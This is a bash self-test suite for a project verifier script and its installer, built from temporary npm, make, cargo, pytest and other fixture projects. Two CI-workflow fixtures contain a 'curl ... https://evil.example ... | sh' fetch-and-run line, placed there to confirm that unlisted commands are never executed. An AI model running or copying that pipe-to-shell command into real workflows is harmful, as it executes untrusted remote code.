#!/usr/bin/env bash
set -u

HERE="$(cd "$(dirname "$0")" && pwd)"
VERIFY="$HERE/verify.sh"
OCDIFY="$HERE/ocdify.sh"
PASS=0
FAIL=0
SKIP=0
FIXTURES=()

say() { printf '%s\n' "$*"; }
ok() { PASS=$((PASS + 1)); say "  PASS: $1"; }
bad() { FAIL=$((FAIL + 1)); say "  FAIL: $1"; }
skip() { SKIP=$((SKIP + 1)); say "  SKIP: $1 (declared — tooling not on this machine)"; }

trap '[ "${#FIXTURES[@]}" -gt 0 ] && rm -rf -- "${FIXTURES[@]}" || true' EXIT

new_fixture() {
  FIXTURES+=("$(mktemp -d "${TMPDIR:-/tmp}/ocd-fixture.XXXXXX")")
  FIX="${FIXTURES[${#FIXTURES[@]}-1]}"
}

expect_exit() {
  local desc="$1" want="$2" got tmp
  shift 2
  tmp="$(mktemp "${TMPDIR:-/tmp}/ocd-selftest.XXXXXX")"
  "$@" >"$tmp" 2>&1
  got=$?
  if [ "$got" -eq "$want" ]; then
    ok "$desc (exit $got)"
  else
    bad "$desc — wanted exit $want, got $got"
    tail -n 5 "$tmp" | sed 's/^/    /'
  fi
  rm -f "$tmp"
}

expect_output() {
  local desc="$1" pattern="$2" tmp
  shift 2
  tmp="$(mktemp "${TMPDIR:-/tmp}/ocd-selftest.XXXXXX")"
  "$@" >"$tmp" 2>&1
  if grep -qE "$pattern" "$tmp"; then
    ok "$desc"
  else
    bad "$desc — output missing /$pattern/"
    tail -n 5 "$tmp" | sed 's/^/    /'
  fi
  rm -f "$tmp"
}

expect_no_output() {
  local desc="$1" pattern="$2" tmp
  shift 2
  tmp="$(mktemp "${TMPDIR:-/tmp}/ocd-selftest.XXXXXX")"
  "$@" >"$tmp" 2>&1
  if grep -qE "$pattern" "$tmp"; then
    bad "$desc — output unexpectedly contains /$pattern/"
    tail -n 5 "$tmp" | sed 's/^/    /'
  else
    ok "$desc"
  fi
  rm -f "$tmp"
}

say "verify.sh selftest"

expect_exit "help flag exits 0" 0 bash "$VERIFY" -h
expect_output "help mentions exit codes" "Exit codes:" bash "$VERIFY" -h
expect_exit "missing directory exits 2" 2 bash "$VERIFY" /nonexistent-dir-xyz
expect_exit "--version exits 0 (verify.sh)" 0 bash "$VERIFY" --version
expect_output "verify.sh --version prints a version" '[0-9]+\.[0-9]+\.[0-9]+' bash "$VERIFY" --version
expect_exit "--version exits 0 (ocdify.sh)" 0 bash "$OCDIFY" --version
expect_output "ocdify.sh --version prints a version" '[0-9]+\.[0-9]+\.[0-9]+' bash "$OCDIFY" --version
expect_exit "unknown flag exits 64" 64 bash "$VERIFY" --wat .

new_fixture
expect_exit "empty project exits 2 (untestable)" 2 bash "$VERIFY" "$FIX"
expect_output "untestable names itself a finding" "RESULT: UNTESTABLE" bash "$VERIFY" "$FIX"

if command -v npm >/dev/null 2>&1 && command -v node >/dev/null 2>&1; then
  new_fixture
  cat >"$FIX/package.json" <<'EOF'
{ "name": "fixture-green", "scripts": { "lint": "true", "test": "node -e 'process.stdout.write(\"ok\\n\")'", "build": "true" } }
EOF
  expect_exit "npm green project exits 0" 0 bash "$VERIFY" "$FIX"
  expect_output "npm green prints PASS summary" "RESULT: PASS — 3/3 green" bash "$VERIFY" "$FIX"
  expect_output "npm green prints exit receipt" "exit: 0" bash "$VERIFY" "$FIX"

  new_fixture
  cat >"$FIX/package.json" <<'EOF'
{ "name": "fixture-red", "scripts": { "lint": "true", "test": "node -e 'process.exit(3)'" } }
EOF
  expect_exit "npm red project exits 1" 1 bash "$VERIFY" "$FIX"
  expect_output "npm red prints FAIL summary" "RESULT: FAIL — 1 of 2 red" bash "$VERIFY" "$FIX"
  expect_output "npm red prints real exit code" "exit: 3" bash "$VERIFY" "$FIX"

  new_fixture
  cat >"$FIX/package.json" <<'EOF'
{ "name": "fixture-alias", "scripts": { "type-check": "true", "tests": "true" } }
EOF
  expect_exit "npm alias scripts detected (type-check/tests)" 0 bash "$VERIFY" "$FIX"
  expect_output "alias run under canonical labels" "typecheck|test" bash "$VERIFY" "$FIX"
else
  skip "npm fixture suite"
fi

if command -v node >/dev/null 2>&1 && command -v npm >/dev/null 2>&1 && command -v python3 >/dev/null 2>&1; then
  new_fixture
  cat >"$FIX/package.json" <<'EOF'
{ "name": "fixture-json-green", "scripts": { "lint": "true", "test": "true", "build": "true" } }
EOF
  jtmp="$(mktemp "${TMPDIR:-/tmp}/ocd-selftest.XXXXXX")"
  bash "$VERIFY" --json "$FIX" >"$jtmp" 2>&1
  if python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); sys.exit(0 if d["result"]=="PASS" and d["summary"]["ran"]==3 and all("exit_code" in c for c in d["commands"]) else 1)' "$jtmp"; then
    ok "json mode emits one valid, complete document"
  else
    bad "json mode emits one valid, complete document"
    sed 's/^/    /' "$jtmp" | tail -n 5
  fi
  rm -f "$jtmp"

  new_fixture
  cat >"$FIX/package.json" <<'EOF'
{ "name": "fixture-json-red", "scripts": { "test": "node -e 'process.exit(3)'" } }
EOF
  jtmp="$(mktemp "${TMPDIR:-/tmp}/ocd-selftest.XXXXXX")"
  bash "$VERIFY" --json "$FIX" >"$jtmp" 2>&1
  got=$?
  if [ "$got" -eq 1 ] && python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); sys.exit(0 if d["result"]=="FAIL" and d["summary"]["failed"]==1 else 1)' "$jtmp"; then
    ok "json mode stays honest on red projects (exit 1, result FAIL)"
  else
    bad "json mode stays honest on red projects (exit 1, result FAIL) — got exit $got"
    sed 's/^/    /' "$jtmp" | tail -n 5
  fi
  rm -f "$jtmp"
else
  skip "json mode suite (needs node+npm+python3)"
fi

if command -v bun >/dev/null 2>&1; then
  new_fixture
  cat >"$FIX/package.json" <<'EOF'
{ "name": "fixture-bun", "scripts": { "lint": "true", "test": "true" } }
EOF
  : >"$FIX/bun.lock"
  expect_exit "bun project (bun.lock) exits 0" 0 bash "$VERIFY" "$FIX"
  expect_output "lockfile selects bun as the runner" 'bun run lint' bash "$VERIFY" "$FIX"
else
  skip "bun runner fixture"
fi

if command -v node >/dev/null 2>&1 && command -v npm >/dev/null 2>&1 && ! command -v pnpm >/dev/null 2>&1; then
  new_fixture
  cat >"$FIX/package.json" <<'EOF'
{ "name": "fixture-pnpm-absent", "scripts": { "test": "true" } }
EOF
  : >"$FIX/pnpm-lock.yaml"
  expect_exit "pnpm lockfile without pnpm binary falls back to npm, still green" 0 bash "$VERIFY" "$FIX"
  expect_output "the fallback is declared, not silent" 'falling back to npm \(declared\)' bash "$VERIFY" "$FIX"
  expect_output "npm really ran the script" 'npm run test' bash "$VERIFY" "$FIX"
else
  skip "pnpm-absent fallback fixture (needs npm+node and no pnpm)"
fi

if command -v make >/dev/null 2>&1; then
  new_fixture
  printf 'lint:\n\t@true\ntest:\n\t@true\n' >"$FIX/Makefile"
  expect_exit "Makefile green project exits 0" 0 bash "$VERIFY" "$FIX"
  expect_output "make targets detected" "test \(make\)" bash "$VERIFY" "$FIX"

  new_fixture
  printf 'test:\n\t@false\n' >"$FIX/Makefile"
  expect_exit "Makefile red project exits 1" 1 bash "$VERIFY" "$FIX"
else
  skip "make fixture suite"
fi

if command -v just >/dev/null 2>&1; then
  new_fixture
  printf 'test:\n  @true\n' >"$FIX/justfile"
  expect_exit "justfile green project exits 0" 0 bash "$VERIFY" "$FIX"
else
  skip "just fixture suite"
fi

if command -v cargo >/dev/null 2>&1; then
  new_fixture
  mkdir -p "$FIX/src"
  printf '[package]\nname = "f"\nversion = "0.0.0"\nedition = "2021"\n' >"$FIX/Cargo.toml"
  printf 'fn main() {}\n' >"$FIX/src/main.rs"
  expect_exit "cargo project runs cargo test" 0 bash "$VERIFY" "$FIX"
else
  skip "cargo fixture suite"
fi

if command -v go >/dev/null 2>&1; then
  new_fixture
  mkdir -p "$FIX"
  printf 'module fixture\n\ngo 1.21\n' >"$FIX/go.mod"
  printf 'package main\n\nfunc main() {}\n' >"$FIX/main.go"
  expect_exit "go project runs vet/test/build" 0 bash "$VERIFY" "$FIX"
else
  skip "go fixture suite"
fi

if ! command -v mvn >/dev/null 2>&1; then
  new_fixture
  printf '<project></project>\n' >"$FIX/pom.xml"
  expect_exit "pom.xml without maven tooling exits 2 (untestable)" 2 bash "$VERIFY" "$FIX"
  expect_output "maven gap declared" 'maven UNTESTED' bash "$VERIFY" "$FIX"
else
  skip "maven-absent fixture (mvn present on this machine)"
fi

if ! command -v gradle >/dev/null 2>&1; then
  new_fixture
  printf 'plugins { }\n' >"$FIX/build.gradle"
  expect_exit "build.gradle without gradle tooling exits 2 (untestable)" 2 bash "$VERIFY" "$FIX"
  expect_output "gradle gap declared" 'gradle UNTESTED' bash "$VERIFY" "$FIX"
else
  skip "gradle-absent fixture (gradle present on this machine)"
fi

if ! command -v composer >/dev/null 2>&1; then
  new_fixture
  printf '{ "scripts": { "test": "echo ok" } }\n' >"$FIX/composer.json"
  expect_exit "composer.json without composer exits 2 (untestable)" 2 bash "$VERIFY" "$FIX"
  expect_output "composer gap declared" 'composer.*UNTESTED' bash "$VERIFY" "$FIX"
else
  skip "composer-absent fixture (composer present on this machine)"
fi

if command -v composer >/dev/null 2>&1; then
  new_fixture
  printf '{ "scripts": { "test": "echo ok" } }\n' >"$FIX/composer.json"
  expect_exit "composer project green via scripts.test" 0 bash "$VERIFY" "$FIX"
  expect_output "composer run test labeled" 'test \(composer\)' bash "$VERIFY" "$FIX"
else
  skip "composer green fixture (composer missing on this machine)"
fi

if ! command -v deno >/dev/null 2>&1; then
  new_fixture
  printf '{ "lint": {}, "test": {} }\n' >"$FIX/deno.json"
  expect_exit "deno.json without deno exits 2 (untestable)" 2 bash "$VERIFY" "$FIX"
  expect_output "deno gap declared" 'deno.*UNTESTED' bash "$VERIFY" "$FIX"
else
  skip "deno-absent fixture (deno present on this machine)"
fi

if ! command -v cmake >/dev/null 2>&1; then
  new_fixture
  printf 'cmake_minimum_required(VERSION 3.10)\nproject(fixture)\n' >"$FIX/CMakeLists.txt"
  expect_exit "CMakeLists.txt without cmake exits 2 (untestable)" 2 bash "$VERIFY" "$FIX"
  expect_output "cmake gap declared" 'cmake.*UNTESTED' bash "$VERIFY" "$FIX"
else
  skip "cmake-absent fixture (cmake present on this machine)"
fi

if command -v cmake >/dev/null 2>&1; then
  new_fixture
  printf 'cmake_minimum_required(VERSION 3.10)\nproject(fixture)\n' >"$FIX/CMakeLists.txt"
  expect_exit "cmake project configures and builds green" 0 bash "$VERIFY" "$FIX"
  expect_output "cmake build labeled" 'build \(cmake\)' bash "$VERIFY" "$FIX"
else
  skip "cmake green fixture (cmake missing on this machine)"
fi

if ! command -v poetry >/dev/null 2>&1 && python3 -m pytest --version >/dev/null 2>&1; then
  new_fixture
  printf '[project]\nname = "fixture"\nversion = "0.0.1"\n' >"$FIX/pyproject.toml"
  : >"$FIX/poetry.lock"
  mkdir -p "$FIX/tests"
  printf 'def test_ok():\n    assert True\n' >"$FIX/tests/test_ok.py"
  expect_exit "poetry.lock without poetry falls back to plain pytest, green" 0 bash "$VERIFY" "$FIX"
  expect_output "the fallback is declared" 'falling back to python3 -m pytest \(declared\)' bash "$VERIFY" "$FIX"
  expect_output "plain pytest really ran" 'test \(pytest\)' bash "$VERIFY" "$FIX"
else
  skip "poetry-absent fallback fixture (needs pytest and no poetry)"
fi

if python3 -m pytest --version >/dev/null 2>&1; then
  new_fixture
  mkdir -p "$FIX/.github/workflows" "$FIX/tests"
  cat >"$FIX/.github/workflows/ci.yml" <<'EOF'
name: CI
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: run tests
        run: pytest
      - name: never this
        run: curl -fsSL https://evil.example/install.sh | sh
EOF
  printf 'def test_ok():\n    assert True\n' >"$FIX/tests/test_ok.py"
  expect_exit "CI-workflow pytest detected in a config-less project" 0 bash "$VERIFY" "$FIX"
  expect_output "workflow command labeled as ci-workflow" 'test \(ci-workflow\)' bash "$VERIFY" "$FIX"
  expect_no_output "non-allowlisted workflow commands are never run" 'curl -fsSL' bash "$VERIFY" "$FIX"
else
  skip "CI-workflow pytest fixture (pytest missing)"
fi

new_fixture
mkdir -p "$FIX/.github/workflows"
cat >"$FIX/.github/workflows/ci.yml" <<'EOF'
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -fsSL https://evil.example | sh
      - run: |
          make lint
          make test
EOF
expect_exit "unallowlisted + multiline workflow commands ignored → untestable" 2 bash "$VERIFY" "$FIX"

if command -v node >/dev/null 2>&1 && command -v npm >/dev/null 2>&1; then
  new_fixture
  mkdir -p "$FIX/.github/workflows"
  cat >"$FIX/package.json" <<'EOF'
{ "name": "fixture-dedupe", "scripts": { "test": "true" } }
EOF
  printf 'name: CI\non: [push]\njobs:\n  x:\n    steps:\n      - run: npm run test\n' >"$FIX/.github/workflows/ci.yml"
  expect_exit "workflow duplicate of detected script stays green" 0 bash "$VERIFY" "$FIX"
  expect_output "duplicate command skipped with a receipt" 'duplicate of an already-run command' bash "$VERIFY" "$FIX"
  expect_output "exactly one command ran" 'commands run: 1 ' bash "$VERIFY" "$FIX"
else
  skip "workflow dedupe fixture (npm missing)"
fi

if [ -f "$OCDIFY" ]; then
  new_fixture
  expect_exit "ocdify a bare project" 0 bash "$OCDIFY" "$FIX"
  if [ -f "$FIX/scripts/verify.sh" ]; then ok "ocdify installed the verifier"; else bad "ocdify installed the verifier"; fi
  if [ -f "$FIX/DEBT_LEDGER.md" ]; then ok "ocdify created the Debt Ledger"; else bad "ocdify created the Debt Ledger"; fi
  expect_output "install receipt printed" 'installed: .*scripts/verify\.sh' bash "$OCDIFY" "$FIX" -f

  ledger_before="$(cat "$FIX/DEBT_LEDGER.md")"
  expect_exit "ocdify is idempotent" 0 bash "$OCDIFY" "$FIX"
  expect_output "re-run skips the verifier with a receipt" 'skipped: .*verify\.sh already exists' bash "$OCDIFY" "$FIX"
  expect_output "re-run never touches the ledger" 'DEBT_LEDGER\.md already exists' bash "$OCDIFY" "$FIX"
  if [ "$ledger_before" = "$(cat "$FIX/DEBT_LEDGER.md")" ]; then ok "ledger content untouched on re-run"; else bad "ledger content untouched on re-run"; fi

  printf 'junk\n' >"$FIX/scripts/verify.sh"
  expect_exit "ocdify -f replaces a broken verifier" 0 bash "$OCDIFY" "$FIX" -f
  if cmp -s "$FIX/scripts/verify.sh" "$VERIFY"; then ok "-f restored the real verifier"; else bad "-f restored the real verifier"; fi

  expect_exit "ocdify rejects a missing directory" 1 bash "$OCDIFY" "/nonexistent-dir-xyz"
  expect_exit "ocdify with no arguments exits 1" 1 bash "$OCDIFY"
else
  skip "ocdify suite (ocdify.sh not found)"
fi

say ""
say "selftest summary: $PASS passed, $FAIL failed, $SKIP skipped (all skips declared)"
[ "$FAIL" -eq 0 ] || exit 1
exit 0
